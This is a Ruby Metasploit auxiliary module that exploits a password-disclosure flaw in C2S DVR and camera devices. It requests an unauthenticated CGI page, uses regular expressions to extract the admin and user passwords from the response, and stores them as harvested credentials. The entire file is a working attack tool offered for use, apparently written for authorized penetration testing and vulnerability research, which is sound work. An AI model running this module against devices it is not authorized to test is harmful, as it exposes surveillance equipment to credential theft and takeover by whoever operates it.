##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'         => 'C2S DVR Management Password Disclosure',
      'Description'  => %q{
        C2S DVR allows an unauthenticated user to disclose the username
        & password by requesting the javascript page 'read.cgi?page=2'.
        This may also work on some cameras including IRDOME-II-C2S, IRBOX-II-C2S.
      },
      'References'   => [['EDB', '40265']],
      'Author'       =>
        [
          'Yakir Wizman', # discovery
          'h00die',    # module
        ],
      'License'      => MSF_LICENSE,
      'DisclosureDate' => 'Aug 19 2016'
    )

    register_options([
      OptString.new('TARGETURI', [false, 'URL of the C2S DVR root', '/'])
    ])
  end

  def run_host(rhost)
    begin
      url = normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'read.cgi')
      vprint_status("Attempting to load data from #{url}?page=2")
      res = send_request_cgi({
        'uri'      => url,
        'vars_get' => {'page'=>'2'}
      })
      unless res
        print_error("#{peer} Unable to connect to #{url}")
        return
      end

      unless res.body.include?('pw_enflag')
        print_error("Invalid response received for #{peer} for #{url}")
        return
      end

      if res.body =~ /pw_adminpw = "(.+?)";/
        print_good("Found: admin:#{$1}")
        store_valid_credential(
          user:         'admin',
          private:      $1,
          private_type: :password
        )
      end

      if res.body =~ /pw_userpw = "(.+?)";/
        print_good("Found: user:#{$1}")
        store_valid_credential(
          user:         'user',
          private:      $1,
          private_type: :password
        )
      end
    rescue ::Rex::ConnectionError
      print_error("#{peer} Unable to connect to site")
      return
    end
  end
end
